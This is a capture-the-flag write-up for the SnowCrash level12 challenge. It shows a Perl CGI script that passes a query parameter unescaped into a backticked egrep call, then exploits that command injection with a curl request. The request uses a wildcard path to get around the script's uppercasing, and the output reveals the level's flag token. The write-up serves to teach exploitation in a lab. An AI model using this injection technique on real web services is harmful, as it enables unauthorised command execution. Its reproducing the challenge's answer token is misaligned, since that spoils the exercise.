## Observation

-> perl script with SUID 

```bash
.level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
## Explanation

1. Reads x and y from the HTTP query, uppercases and truncates x, then runs egrep "^$xx" /tmp/xd and captures its output.

2. For each matching line it splits on :, and returns success if the second field matches the pattern y (used as a regex).

3. Prints .. on success or . on failure.

--------------------------

In the script we saw that a regex capitalize every letter of the X param.
So we cannot write directly X = getflag. 

We will create a file with geflag command inside.

```bash
level12@SnowCrash:/var/crash$ nano EXPLOIT
level12@SnowCrash:/var/crash$ cat EXPLOIT 
#!/bin/sh
getflag > /tmp/flag
level12@SnowCrash:/var/crash$ chmod +x EXPLOIT
level12@SnowCrash:/var/crash$ 
```

## Exploit

then return home for curl

level12@SnowCrash:/tmp$ cd /home/user/level12
level12@SnowCrash:~$  curl localhost:4646?x='`/*/EXPLOIT`'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ 